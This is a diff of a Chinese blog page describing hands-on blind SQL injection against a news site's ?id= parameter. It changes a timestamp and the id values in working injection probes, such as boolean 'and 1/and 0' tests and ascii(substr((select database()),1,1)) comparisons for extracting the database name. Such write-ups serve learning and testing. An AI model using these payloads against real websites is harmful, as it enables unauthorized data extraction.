@@ -120,7 +120,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql21.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql20.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/kabesql22.PNG">
-<meta property="og:updated_time" content="2018-03-07T13:35:31.125Z">
+<meta property="og:updated_time" content="2018-03-07T13:57:18.244Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql盲注实战">
 <meta name="twitter:description" content="这站其实有回显的 但还是选择练习下盲注">
@@ -368,11 +368,11 @@
 <p>随手点了点页面上的连接 </p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql14.PNG" alt=""></p>
 <p>出现了熟悉的?id=<br><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql15.PNG" alt=""></p>
-<h3 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h3><p>尝试 ?id=21^1 ?id=20^0 发现不行</p>
-<p>?id=21 and 1 ?id=20 and 0 回显信息不同 可以利用</p>
+<h3 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h3><p>尝试 ?id=20^1 ?id=20^0 发现不行</p>
+<p>?id=20 and 1 ?id=20 and 0 回显信息不同 可以利用</p>
 <p>不放心又试了一下</p>
-<p>?id=21 and 1 ascii(substr((select database()),1,1))&gt;64</p>
-<p>?id=21 and 1 ascii(substr((select database()),1,1))&gt;127</p>
+<p>?id=20 and 1 ascii(substr((select database()),1,1))&gt;64</p>
+<p>?id=20 and 1 ascii(substr((select database()),1,1))&gt;127</p>
 <p>回显的确不同 正常情况右下角会回显出 news 的相关信息 可以盲注</p>
 <p>但是还有个坑点。。在 id=20时虽然回显的不同 但由于回显的信息太短</p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/kabesql17.PNG" alt=""></p>
